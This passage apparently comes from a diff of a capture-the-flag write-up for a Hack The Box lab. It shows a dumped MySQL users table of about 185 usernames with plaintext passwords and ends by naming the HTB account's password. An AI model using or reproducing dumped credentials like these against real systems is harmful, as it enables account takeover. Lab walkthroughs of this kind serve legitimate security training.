+|   16 | sheartfieldf      | ofTf0hE7OL                   |
+|   17 | aalvesg           | diTzuE                       |
+|   18 | eshilstoneh       | NVSRa5L8Lx                   |
+|   19 | eludovicoi        | w2uUtLGYkDi                  |
+|   20 | rcoppenhallj      | 8T1AO16C4pm                  |
+|   21 | rfuxmank          | oOVWyPyo                     |
+|   22 | tmoraledal        | CDNj7KH                      |
+|   23 | vdurdanm          | KBM4BTldF                    |
+|   24 | mlandisn          | oCOZcC                       |
+|   25 | gfancutto         | RNHlBaFKLLt                  |
+|   26 | dfigliovannip     | Cf7T9osx                     |
+|   27 | ngoedeq           | eDfTnH                       |
+|   28 | abalhamr          | Qc2Tia0zM                    |
+|   29 | tmartys           | VC65xd6o                     |
+|   30 | sallewellt        | Y5VSv1rm                     |
+|   31 | mjoveyu           | ej3amn                       |
+|   32 | mgoodlifev        | lCbzNIw7B90                  |
+|   33 | gmargeramw        | hbVF2G                       |
+|   34 | leberlex          | Nj6UCAQ                      |
+|   35 | mtrimbyy          | jfNkfg5ZW                    |
+|   36 | mkimmz            | pZZepTCVlkN                  |
+|   37 | mflaunier10       | 9TZ8mfLA                     |
+|   38 | vgomes11          | qM6nHjMtD                    |
+|   39 | sbrimham12        | FoXudHc4Ocr                  |
+|   40 | cbendle13         | zFUIGVBx                     |
+|   41 | ralgeo14          | YTB8IXOk                     |
+|   42 | rsandyfirth15     | vARbkPRQv                    |
+|   43 | bcarlesi16        | m4H6q6pH                     |
+|   44 | cfrude17          | Za8UHiSe25N                  |
+|   45 | rjullian18        | 6QyxSjg                      |
+|   46 | bgissing19        | fjes6w8Ovw0                  |
+|   47 | limore1a          | gVzkv8syQ                    |
+|   48 | scarlisle1b       | sR9rPBL5                     |
+|   49 | hamoss1c          | tbmK9XBhn57j                 |
+|   50 | cradmore1d        | TQkfKxEl7                    |
+|   51 | apetican1e        | ABibihOvMOu                  |
+|   52 | eweber1f          | sEDynNORm7b                  |
+|   53 | nbockmaster1g     | M1tVaH                       |
+|   54 | cianne1h          | Vc8agpinq                    |
+|   55 | khatchette1i      | xXOnQFOsF0I                  |
+|   56 | tkroger1j         | uisR7g1eVEU                  |
+|   57 | sgladtbach1k      | iIVQ4l                       |
+|   58 | bmockford1l       | BBsZPmwk0r                   |
+|   59 | balabone1m        | aTUbGm0                      |
+|   60 | jmantripp1n       | DTVAdvbadbA2                 |
+|   61 | tchown1o          | dCulXiBc                     |
+|   62 | vconradsen1p      | v5E0sgqzo                    |
+|   63 | hfudge1q          | cSODbEMtCm                   |
+|   64 | syaneev1r         | ilXo6tKGHY7                  |
+|   65 | btheyer1s         | LxNk1t                       |
+|   66 | fcahn1t           | oSBmcLx                      |
+|   67 | edurrington1u     | LMomwfQkq3                   |
+|   68 | kcounter1v        | 1zUE6RHS                     |
+|   69 | bqueripel1w       | 0A2OfeQPnhd                  |
+|   70 | mnacci1x          | lNyUiY8U4t                   |
+|   71 | dcabell1y         | W6Q7R3zsxB                   |
+|   72 | ctaleworth1z      | d3JWwTj                      |
+|   73 | mmcgrah20         | yPxlvhS                      |
+|   74 | jgannaway21       | oGfIrDxkSIo                  |
+|   75 | eiacovone22       | 8jKlhgvC                     |
+|   76 | rnaughton23       | Gyf6awYCm4                   |
+|   77 | adobbins24        | ashZ0G                       |
+|   78 | pwarbeys25        | nSmfKSYW9GL                  |
+|   79 | bbrabbins26       | YZWuH6D8Q                    |
+|   80 | adandy27          | dF1VPsn                      |
+|   81 | mfarrens28        | ucPclA8K9c                   |
+|   82 | dhaysar29         | MeGzIGeyKXyw                 |
+|   83 | efoot2a           | Q2ks5eg                      |
+|   84 | tpelosi2b         | 8yjhdx                       |
+|   85 | binman2c          | 3uO3PeL8e                    |
+|   86 | krait2d           | EFD5FpEtu2                   |
+|   87 | jcrook2e          | VFsdmvhDz4O                  |
+|   88 | falonso2f         | 4ifO54                       |
+|   89 | jmacak2g          | KUDAxTXU                     |
+|   90 | nnorville2h       | WCYa9C1G                     |
+|   91 | tlevington2i      | If46bHoGr                    |
+|   92 | abartak2j         | erFX4u0e0                    |
+|   93 | jgoad2k           | gunnsPy1pMCd                 |
+|   94 | dwadham2l         | 89IiRFy0frst                 |
+|   95 | hvenditti2m       | NS0U18XON                    |
+|   96 | gpitchers2n       | j7RVE2                       |
+|   97 | aiskowitz2o       | 8iVpSQUEXn2K                 |
+|   98 | gcars2p           | 8i3nsQU9wp                   |
+|   99 | bjacke2q          | 2PtrA0C                      |
+|  100 | fstorton2r        | XmjbfR1vK1                   |
+|  101 | pbrinded2s        | Jf9uWJ                       |
+|  102 | penriques2t       | o3kmQ5zHF5Qb                 |
+|  103 | awinckworth2u     | LEwOydD3nncQ                 |
+|  104 | lkinsell2v        | kvoIZupHNt                   |
+|  105 | wdavisson2w       | nk5HVS                       |
+|  106 | rrenzini2x        | LiCJccRxumYU                 |
+|  107 | kdavys2y          | ZXpRVEn                      |
+|  108 | ravann2z          | YLkKN4JzzM                   |
+|  109 | hrallings30       | 6wS4x0IeLW                   |
+|  110 | sbrackpool31      | lBa8AVaPQg                   |
+|  111 | epulham32         | yIV88FM9DM                   |
+|  112 | mspeachley33      | JSa9aUv1h                    |
+|  113 | vforkan34         | 26Q6gTgsOE8T                 |
+|  114 | jprichard35       | sggVPPMfRA3T                 |
+|  115 | abisatt36         | GcSlKIuky                    |
+|  116 | todocherty37      | BwSfFV3qj                    |
+|  117 | njayne38          | D8yr44NNQ                    |
+|  118 | gwhyman39         | h0WJ4p2F2x8                  |
+|  119 | lkristoffersson3a | mARndSF                      |
+|  120 | lmcallan3b        | gmpkAKF                      |
+|  121 | kdouble3c         | qYtstjmdR                    |
+|  122 | sgooding3d        | venooIUMMHE                  |
+|  123 | lgaffney3e        | 1fCwgoaCtz                   |
+|  124 | emuriel3f         | Wz582Y22                     |
+|  125 | mlamasna3g        | MhqsPNMRYwJE                 |
+|  126 | omander3h         | CuB3JbXJ                     |
+|  127 | fropkes3i         | jVBeawjIPXS                  |
+|  128 | mhawk3j           | g0sPpI8                      |
+|  129 | wseres3k          | zgsXeR7blA                   |
+|  130 | bflaws3l          | 0dTvgBkaFYqi                 |
+|  131 | ccyson3m          | EtCscA                       |
+|  132 | afowell3n         | cRG0x5                       |
+|  133 | jmolian3o         | fCwa9ry                      |
+|  134 | gterzo3p          | Srv77g                       |
+|  135 | ravrahamy3q       | dFjfFMEJ                     |
+|  136 | amaden3r          | n1WAtKT                      |
+|  137 | gdeverall3s       | 1Vj3bbr                      |
+|  138 | ejansema3t        | 4MyiArdEVq                   |
+|  139 | snormanville3u    | l1s9Ao9omd                   |
+|  140 | nfinder3v         | Rd1POwc3                     |
+|  141 | lrodway3w         | UNW82GQfd0q                  |
+|  142 | lstening3x        | JaSkROwU83UB                 |
+|  143 | hemer3y           | GlPpKB                       |
+|  144 | eblamphin3z       | 7Zjz7RvcC9x                  |
+|  145 | lwederell40       | eyWsJl                       |
+|  146 | nverick41         | Mr1r2H                       |
+|  147 | mlawlie42         | XrHEZJbuUd                   |
+|  148 | swahlberg43       | 46gOiZ                       |
+|  149 | crubinivitz44     | FLlYii1mQz84                 |
+|  150 | HTB               | cr3n4o7rzse7rzhnckhssncif7ds |
+|  151 | wdoswell46        | FYXMuelBVcS                  |
+|  152 | ccollingwood47    | LM6SU2N3w7KQ                 |
+|  153 | nfoux48           | N40DfFww                     |
+|  154 | gboyat49          | W1LDy7                       |
+|  155 | csuddick4a        | UIGXl3lL                     |
+|  156 | tmatieu4b         | c5PYl7yfJi                   |
+|  157 | ielsy4c           | 3hLC705Oj                    |
+|  158 | ebotwood4d        | aQmW5c7                      |
+|  159 | gcirlos4e         | SPsU9obCa                    |
+|  160 | smucklestone4f    | Ho96mUx                      |
+|  161 | hdain4g           | BGMRtb                       |
+|  162 | dmcquillin4h      | 37kwHEdFhAlL                 |
+|  163 | gfolan4i          | 1d9kcofM                     |
+|  164 | gtamlett4j        | 4HlL18RM37l3                 |
+|  165 | cchapelle4k       | xezsRgOt8OW8                 |
+|  166 | channy4l          | 68lHKp                       |
+|  167 | ffennick4m        | jNLpCeyoYY                   |
+|  168 | mmcgarrell4n      | Ttvat7WvkI                   |
+|  169 | mmcdowell4o       | jfOR6B                       |
+|  170 | sconquer4p        | ase5Qid5vWD                  |
+|  171 | hskune4q          | UUoqC30g5w                   |
+|  172 | mblasli4r         | dcjNDHzrA                    |
+|  173 | sefford4s         | ui0r4FKwD38                  |
+|  174 | gscotter4t        | f2vUKUzHLmEW                 |
+|  175 | nmenhenitt4u      | gXHceINuKdF                  |
+|  176 | laldridge4v       | 7o4agC3m                     |
+|  177 | rlingner4w        | 8mYREIR7                     |
+|  178 | mmcfall4x         | sd3N0GDK                     |
+|  179 | smoscon4y         | BCPAyKFkKKL                  |
+|  180 | ggillespey4z      | LHyQ7f4Br                    |
+|  181 | onewberry50       | aKdinUPQ9r                   |
+|  182 | dinsley51         | hy8agAF9c4VS                 |
+|  183 | mcommon52         | Buh2VR                       |
+|  184 | bmosdill53        | IgNAGOBrzlu                  |
+|  185 | rrobart54         | SkBqsiQGSK                   |
+|  186 | hdurrance55       | 1cljoZoy7Fc                  |
+|  187 | hwinterflood56    | F9PH0X0                      |
+|  188 | jbier57           | Ug88Nd37N96v                 |
+|  189 | hmaccumeskey58    | 3rb3rz2kq2                   |
+|  190 | orangell59        | IWz01iHsv                    |
+|  191 | velsie5a          | mWcslVm2                     |
+|  192 | igeorgelin5b      | 6WHS6OS                      |
+|  193 | rrushsorth5c      | hXiQn9bW6W                   |
+|  194 | mbrucker5d        | cT5Z6K                       |
+|  195 | darnull5e         | EzagIo6Sd                    |
+|  196 | jparkhouse5f      | HCEchNzf                     |
+|  197 | smcgunley5g       | 9ivT96O                      |
+|  198 | ssoal5h           | qi6WX7TGIA                   |
+|  199 | npeak5i           | 3gR7Iuc0                     |
+|  200 | mleidl5j          | qwfjY9RGk6                   |
++------+-------------------+------------------------------+
+200 rows in set (0.01 sec)
+```
+
+HTB's password is `cr3n4o7rzse7rzhnckhssncif7ds`.
